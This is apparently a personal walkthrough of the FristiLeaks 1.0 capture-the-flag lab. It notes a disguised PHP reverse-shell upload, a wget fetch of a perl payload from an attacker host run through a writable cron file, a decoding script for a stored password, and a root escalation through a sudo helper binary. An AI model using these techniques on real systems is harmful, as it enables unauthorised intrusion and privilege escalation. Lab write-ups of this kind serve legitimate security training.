By dirb and decode:  		
eezeepz  			
keKkeKKeKKeKkEkkEk  		
then upload:  		
http://192.168.139.145/fristi/uploads/revshell.php.jpg  			

```shell
bash-4.1$ cd /home/eezeepz
bash-4.1$ ls -aul
bash-4.1$ cat notes.txt
bash-4.1$ wget 192.168.139.129/perl.pl
Get admin ID:
bash-4.1$ echo "/usr/bin/perl /tmp/perl.pl" > /tmp/runthis
[admin@localhost /]$ whoami
whoami
admin
```shell
Find out the txt:
=RFn0AKnlMHMPIzpyuTI0ITG
Need make a script:
decrypt.py
----------------------------------------------------
import base64, codecs,sys
def decodeString(str):
	rot13crypt=codecs.decode(str[::-1], 'rot13')
	return base64.b64decode(rot13crypt)
print decodeString(sys.argv[1])
----------------------------------------------------

Optional:
```shell
bash-4.1$ echo "/home/admin/chmod 777 /home/admin" > /tmp/runthis
bash-4.1$ cd /tmp
cd /tmp
bash-4.1$ ls
ls
cronresult  runthis
bash-4.1$ cat cronresult
bash-4.1$ cd /home/admin
```
Decrypt password:

LetThereBeFristi!

```shell
sudo -u fristi ./doCom chmod -R 777 /root
```
or
```shell
sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom /bin/bash
```
Final:
bash-4.1# cat fristileaks_secrets.txt
cat fristileaks_secrets.txt
Congratulations on beating FristiLeaks 1.0 by Ar0xA [https://tldr.nu]
I wonder if you beat it in the maximum 4 hours it's supposed to take!
Shoutout to people of #fristileaks (twitter) and #vulnhub (FreeNode)

Flag: Y0u_kn0w_y0u_l0ve_fr1st1
